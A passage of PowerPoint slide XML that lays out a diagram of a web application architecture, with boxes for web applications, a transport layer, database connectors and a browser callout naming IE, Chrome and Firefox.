                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>应用程序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08583" name="Rectangle 7"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4716463" y="3213100"/>
            <a:ext cx="10795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b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>应用程序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08584" name="Rectangle 8"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4716463" y="4221163"/>
            <a:ext cx="1079500" cy="647700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCFFCC"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw dist="35921" dir="2700000" algn="ctr" rotWithShape="0">
              <a:schemeClr val="bg2"/>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>应用程序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08585" name="AutoShape 9"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="5400000">
            <a:off x="1871663" y="2962275"/>
            <a:ext cx="360362" cy="1150938"/>
          </a:xfrm>
          <a:prstGeom prst="can">
            <a:avLst>
              <a:gd name="adj" fmla="val 79846"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="99CCFF">
              <a:alpha val="50000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw dist="35921" dir="2700000" algn="ctr" rotWithShape="0">
              <a:schemeClr val="bg2"/>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rot="10800000" vert="eaVert" wrap="none" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>传输层</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="2" name="Group 13"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="6581775" y="2736850"/>
            <a:ext cx="1878013" cy="792163"/>
            <a:chOff x="4146" y="1724"/>
            <a:chExt cx="1183" cy="499"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="408588" name="AutoShape 12"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4830" y="1724"/>
              <a:ext cx="499" cy="499"/>
            </a:xfrm>
            <a:prstGeom prst="can">
              <a:avLst>
                <a:gd name="adj" fmla="val 25000"/>
              </a:avLst>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="CCFFFF"/>
            </a:solidFill>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
            </a:ln>
            <a:effectLst>
              <a:outerShdw dist="35921" dir="2700000" algn="ctr" rotWithShape="0">
                <a:schemeClr val="bg2"/>
              </a:outerShdw>
            </a:effectLst>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t>  数据库</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t> </a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="408587" name="AutoShape 11"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="16200000">
              <a:off x="4417" y="1621"/>
              <a:ext cx="223" cy="765"/>
            </a:xfrm>
            <a:prstGeom prst="can">
              <a:avLst>
                <a:gd name="adj" fmla="val 85762"/>
              </a:avLst>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="CCFFFF"/>
            </a:solidFill>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
            </a:ln>
            <a:effectLst>
              <a:outerShdw dist="35921" dir="2700000" algn="ctr" rotWithShape="0">
                <a:schemeClr val="bg2"/>
              </a:outerShdw>
            </a:effectLst>
          </p:spPr>
          <p:txBody>
            <a:bodyPr vert="eaVert" wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t>连接器</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t> </a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="Group 14"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="6588125" y="3860800"/>
            <a:ext cx="1878013" cy="792163"/>
            <a:chOff x="4146" y="1724"/>
            <a:chExt cx="1183" cy="499"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="408591" name="AutoShape 15"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4830" y="1724"/>
              <a:ext cx="499" cy="499"/>
            </a:xfrm>
            <a:prstGeom prst="can">
              <a:avLst>
                <a:gd name="adj" fmla="val 25000"/>
              </a:avLst>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="CCFFFF"/>
            </a:solidFill>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
            </a:ln>
            <a:effectLst>
              <a:outerShdw dist="35921" dir="2700000" algn="ctr" rotWithShape="0">
                <a:schemeClr val="bg2"/>
              </a:outerShdw>
            </a:effectLst>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t>  数据库</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t> </a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="408592" name="AutoShape 16"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="16200000">
              <a:off x="4417" y="1621"/>
              <a:ext cx="223" cy="765"/>
            </a:xfrm>
            <a:prstGeom prst="can">
              <a:avLst>
                <a:gd name="adj" fmla="val 85762"/>
              </a:avLst>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="CCFFFF"/>
            </a:solidFill>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
            </a:ln>
            <a:effectLst>
              <a:outerShdw dist="35921" dir="2700000" algn="ctr" rotWithShape="0">
                <a:schemeClr val="bg2"/>
              </a:outerShdw>
            </a:effectLst>
          </p:spPr>
          <p:txBody>
            <a:bodyPr vert="eaVert" wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t>连接器</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t> </a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="408593" name="AutoShape 17"/>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks noChangeShapeType="1"/>
            <a:stCxn id="408582" idx="3"/>
            <a:endCxn id="408587" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5795963" y="2600325"/>
            <a:ext cx="787400" cy="582613"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd type="triangle" w="med" len="med"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="408594" name="AutoShape 18"/>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks noChangeShapeType="1"/>
            <a:stCxn id="408583" idx="3"/>
            <a:endCxn id="408587" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipV="1">
            <a:off x="5795963" y="3182938"/>
            <a:ext cx="787400" cy="354012"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd type="triangle" w="med" len="med"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="408595" name="AutoShape 19"/>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks noChangeShapeType="1"/>
            <a:endCxn id="408592" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5867400" y="3573463"/>
            <a:ext cx="722313" cy="733425"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd type="triangle" w="med" len="med"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="408596" name="AutoShape 20"/>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks noChangeShapeType="1"/>
            <a:stCxn id="408584" idx="3"/>
            <a:endCxn id="408592" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipV="1">
            <a:off x="5795963" y="4306888"/>
            <a:ext cx="793750" cy="238125"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd type="triangle" w="med" len="med"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="408597" name="AutoShape 21"/>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks noChangeShapeType="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipV="1">
            <a:off x="4211638" y="2708275"/>
            <a:ext cx="431800" cy="720725"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd type="triangle" w="med" len="med"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="408598" name="AutoShape 22"/>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks noChangeShapeType="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4211638" y="3573463"/>
            <a:ext cx="431800" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd type="triangle" w="med" len="med"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="408599" name="AutoShape 23"/>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks noChangeShapeType="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4211638" y="3789363"/>
            <a:ext cx="431800" cy="792162"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd type="triangle" w="med" len="med"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408600" name="Line 24"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="990600" y="3429000"/>
            <a:ext cx="504825" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408601" name="Line 25"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2411413" y="3429000"/>
            <a:ext cx="647700" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408602" name="Line 26"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2411413" y="3644900"/>
            <a:ext cx="647700" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd type="triangle" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408603" name="Line 27"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="1">
            <a:off x="981075" y="3644900"/>
            <a:ext cx="504825" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408607" name="AutoShape 31"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="34924" y="1773238"/>
            <a:ext cx="1089025" cy="1000125"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -2602"/>
              <a:gd name="adj2" fmla="val 86824"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="99CCFF">
              <a:alpha val="50000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="73025" tIns="36512" rIns="73025" bIns="36512" anchor="ctr" anchorCtr="1"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>IE, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Chrome</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Firefox,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>etc.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408608" name="AutoShape 32"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1290637" y="1830388"/>
            <a:ext cx="1500188" cy="1000125"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -44338"/>
              <a:gd name="adj2" fmla="val 107776"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="99CCFF">
              <a:alpha val="50000"/>
            </a:srgbClr>
